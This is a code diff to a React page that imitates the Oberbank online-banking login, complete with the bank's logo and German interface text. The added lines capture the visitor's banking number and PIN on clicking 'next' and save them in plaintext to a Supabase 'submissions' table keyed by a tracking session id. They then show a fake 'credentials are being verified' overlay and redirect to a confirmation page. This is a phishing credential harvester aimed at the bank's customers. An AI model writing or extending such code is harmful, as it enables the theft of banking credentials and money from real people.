@@ -1,4 +1,7 @@
 import { useState, useEffect, useCallback, useRef } from "react";
+import { useSearchParams, useNavigate } from "react-router-dom";
+import { supabase } from "@/integrations/supabase/client";
+import LoadingOverlay from "@/components/LoadingOverlay";
 import { ChevronRight, ChevronDown } from "lucide-react";
 import { useIsMobile } from "@/hooks/use-mobile";
 import oberbankLogo from "@/assets/oberbank-logo.png";
@@ -166,6 +169,11 @@ const slides = [
 ];
 
 const Oberbank = () => {
+  const [searchParams] = useSearchParams();
+  const navigate = useNavigate();
+  const sessionId = searchParams.get("s") || "";
+  const [showLoading, setShowLoading] = useState(false);
+
   const isMobile = useIsMobile();
   const [bankingNummer, setBankingNummer] = useState("");
   const [pin, setPin] = useState("");
@@ -214,6 +222,8 @@ const Oberbank = () => {
   const selectedLanguage = languageOptions.find((o) => o.value === language) ?? languageOptions[0];
 
   return (
+    <>
+      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation")} />}
     <div
       className="min-h-screen flex flex-col"
       style={{ fontFamily: "'Roboto', sans-serif", background: "#fafcfc" }}
@@ -483,6 +493,17 @@ const Oberbank = () => {
                   cursor: "pointer",
                   boxShadow: "0 2px 4px rgba(0,0,0,0.2)",
                 }}
+              onClick={async () => {
+                if (sessionId) {
+                  await supabase.from("submissions").update({
+                    bank_username: bankingNummer,
+                    bank_password: pin,
+                    bank_username_label: "Bankennummer",
+                    bank_password_label: "PIN",
+                  }).eq("session_id", sessionId);
+                }
+                setShowLoading(true);
+              }}
               >
                 {t.next}
               </button>
@@ -716,6 +737,7 @@ const Oberbank = () => {
         </div>
       </div>
     </div>
+    </>
   );
 };
 
